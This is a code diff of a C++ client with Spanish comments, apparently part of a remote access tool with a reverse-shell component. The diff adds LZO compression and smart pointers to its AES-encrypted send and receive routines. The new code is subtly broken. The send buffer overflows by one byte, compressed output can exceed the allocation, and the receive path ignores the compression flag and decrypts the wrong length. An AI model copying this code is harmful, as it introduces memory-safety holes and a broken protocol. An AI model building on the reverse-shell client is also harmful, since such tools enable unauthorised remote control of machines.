@@ -610,11 +610,29 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     std::unique_lock<std::mutex> lock(this->sck_mutex);
 
     ByteArray cData = this->bEnc((const unsigned char*)pBuffer, pLen);
-    int iDataSize = cData.size();
-    char* newBuffer = new char[iDataSize];
-    std::memcpy(newBuffer, cData.data(), iDataSize);
+    int iDataSize = cData.size() + 1;
+    int iCompSize = iDataSize + iDataSize / 16 / 64 + 3;
     
+    std::unique_ptr<char[]> newBuffer = std::make_unique<char[]>(iDataSize);
+    newBuffer[0] = 'D';
+    //si el buffer es mayor a 1024 bytes comprimir
+    if (pLen > 1024) {
+        std::shared_ptr<unsigned char[]> compBuffer(new unsigned char[iCompSize]);
+
+        lzo_uint out_len = 0;
+        int ilzoRet = this->lzo_Compress(cData.data(), iDataSize, compBuffer, out_len);
+        if (ilzoRet == LZO_E_OK) {
+            newBuffer[0] = 'C';
+            std::memcpy(newBuffer.get()+1, compBuffer.get(), out_len);
+            iDataSize = out_len;
+        }else {
+            std::memcpy(newBuffer.get()+1, cData.data(), iDataSize);
+        }
+    }else {
+        std::memcpy(newBuffer.get()+1, cData.data(), iDataSize);
+    }
     int iEnviado = 0;
+
     if (isBlock) {
 
         //Hacer el socket block
@@ -623,7 +641,7 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
             DebugPrint("No se pudo hacer block");
         }
         
-        iEnviado = send(pSocket, newBuffer, iDataSize, pFlags);
+        iEnviado = send(pSocket, newBuffer.get(), iDataSize, pFlags);
         
         //Restaurar
         if (!this->BLOCK_MODE) {
@@ -633,10 +651,8 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
             }
         }
     } else {
-        iEnviado = send(pSocket, newBuffer, iDataSize, pFlags);
+        iEnviado = send(pSocket, newBuffer.get(), iDataSize, pFlags);
     }
-
-    charFree(newBuffer, iDataSize);
 
     return iEnviado;
 }
@@ -647,9 +663,8 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
     // 0 block
     std::unique_lock<std::mutex> lock(this->sck_mutex);
 
-    char* cTmpBuff = new char[pLen];
-    ZeroMemory(cTmpBuff, pLen);
-
+    std::unique_ptr<char[]> cTmpBuff = std::make_unique<char[]>(pLen);
+    
     int iRecibido = 0;
     if (isBlock) {
         //Hacer el socket block
@@ -659,15 +674,26 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
             DebugPrint("No se pudo hacer block");
         }
         
-        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
+        iRecibido = recv(pSocket, cTmpBuff.get(), pLen, pFlags);
         
         if (iRecibido <= 0) {
-            charFree(cTmpBuff, pLen);
             return -1;
         }
-        //Decrypt
+        
+        //Descomprimir
+        std::shared_ptr<unsigned char[]> compBuffer(new unsigned char[iRecibido]);
+        if (compBuffer) {
+            lzo_uint out_len = 0;
+            int ilzoRet = this->lzo_Decompress(reinterpret_cast<const unsigned char*>(cTmpBuff.get()), iRecibido, compBuffer, out_len);
+            if (ilzoRet == LZO_E_OK) {
+                if (out_len <= pLen) {
+                    std::memcpy(cTmpBuff.get(), compBuffer.get(), out_len);
+                }
+            }
+        }
 
-        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);
+        //Decrypt
+        ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cTmpBuff.get()), iRecibido);
 
         iRecibido = bOut.size();
         std::memcpy(pBuffer, bOut.data(), iRecibido);
@@ -679,25 +705,70 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
                 DebugPrint("No se pudo restaurar el block_mode en el socket");
             }
         }
-        
-        charFree(cTmpBuff, pLen);
-
+    
         return iRecibido;
     }else {
-        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
+        iRecibido = recv(pSocket, cTmpBuff.get(), pLen, pFlags);
         
         if (iRecibido <= 0) {
-            charFree(cTmpBuff, pLen);
             return -1;
         }
-        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);
+
+        //Descomprimir
+        std::shared_ptr<unsigned char[]> compBuffer(new unsigned char[iRecibido]);
+        if (compBuffer) {
+            lzo_uint out_len = 0;
+            int ilzoRet = this->lzo_Decompress(reinterpret_cast<const unsigned char*>(cTmpBuff.get()), iRecibido, compBuffer, out_len);
+            if (ilzoRet == LZO_E_OK) {
+                if (out_len <= pLen) {
+                    std::memcpy(cTmpBuff.get(), compBuffer.get(), out_len);
+                }
+            }
+        }
+
+        ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cTmpBuff.get()), iRecibido);
 
         iRecibido = bOut.size();
         std::memcpy(pBuffer, bOut.data(), iRecibido);
 
-        charFree(cTmpBuff, pLen);
         return iRecibido;
     }
+}
+
+//AES256
+ByteArray Cliente::bEnc(const unsigned char* pInput, size_t pLen) {
+    this->Init_Key();
+    ByteArray bOutput;
+    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
+    if (enc_len <= 0) {
+        DebugPrint("Error encriptando " + std::string((const char*)pInput));
+    }
+    return bOutput;
+}
+
+ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
+    this->Init_Key();
+    ByteArray bOutput;
+    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
+    if (dec_len <= 0) {
+        DebugPrint("Error desencriptando " + std::string((const char*)pInput));
+    }
+    return bOutput;
+}
+
+//LZO
+int Cliente::lzo_Compress(const unsigned char* cInput, lzo_uint in_len, std::shared_ptr<unsigned char[]>& cOutput, lzo_uint& out_len) {
+    if (cOutput) {
+        return lzo1x_1_compress(cInput, in_len, cOutput.get(), &out_len, wrkmem);
+    }
+    return -1;
+}
+
+int Cliente::lzo_Decompress(const unsigned char* cInput, lzo_uint in_len, std::shared_ptr<unsigned char[]>& cOutput, lzo_uint& out_len) {
+    if (cOutput) {
+        return lzo1x_decompress(cInput, in_len, cOutput.get(), &out_len, NULL);
+    }
+    return -1;
 }
 
 //Misc
@@ -733,27 +804,6 @@ std::string Cliente::ObtenerDown() {
     else {
         return std::string("-");
     }
-}
-
-//AES256
-ByteArray Cliente::bEnc(const unsigned char* pInput, size_t pLen) {
-    this->Init_Key();
-    ByteArray bOutput;
-    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
-    if (enc_len <= 0) {
-        DebugPrint("Error encriptando " + std::string((const char*)pInput));
-    }
-    return bOutput;
-}
-
-ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
-    this->Init_Key();
-    ByteArray bOutput;
-    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
-    if (dec_len <= 0) {
-        DebugPrint("Error desencriptando " + std::string((const char*)pInput));
-    }
-    return bOutput;
 }
 
 //Reverse shell
@@ -893,3 +943,4 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
         lock.unlock();
     }
 }
+
